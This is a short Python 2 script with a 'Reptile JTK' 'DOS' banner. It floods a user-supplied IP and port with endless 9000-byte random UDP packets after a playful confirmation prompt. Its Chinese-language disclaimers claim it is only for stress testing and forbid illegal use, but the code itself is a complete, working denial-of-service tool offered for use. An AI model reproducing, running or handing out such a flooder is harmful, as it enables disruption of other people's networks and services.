#!/usr/bin/python
# -*- coding: UTF-8 -*-

import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(9000)

print ('\033[1;33;40m ')
print('____            _   _ _            _ _____ _  __')
print('|  _ \ ___ _ __ | |_(_) | ___      | |_   _| |/ /')
print('| |_) / _ \  _ \| __| | |/ _ \  _  | | | | |   /')
print('|  _ <  __/ |_) | |_| | |  __/ | |_| | | | | . \ ')
print('|_| \_\___| .__/ \__|_|_|\___|  \___/  |_| |_|\_\ ')
print('           |_|                                   ')
print('DOS')
print('该工具严禁用于非法攻击！严禁用于犯罪！严禁用于违法！严禁用于损害他人和社会！严禁攻击正规网站！严禁攻击国防网站！否则后果自负！后果自负！后果自负！\n')
print('该工具仅限用于测试压力！还有装逼\n')
print('金条k不负任何法律责任\n')

ip = raw_input("攻击目标的ip: ")
a = input("目标的端口: ")

b = input("\n请确认你准备好攻击了？\n[1]直接攻击\n[2]不攻击了，我怕了\n")

if b in [2]: 
  print('瞧你那怂样')
  exit()

if b in [1]: 
   print('开始攻击')
sent = 0
while True:
     sock.sendto(bytes, (ip,a))
     sent = sent + 1
     a = a
     print "已发送 %s 个数据包至 %s ，端口为:%s"%(sent,ip,a)
     if a == 9999999999:
       a = 1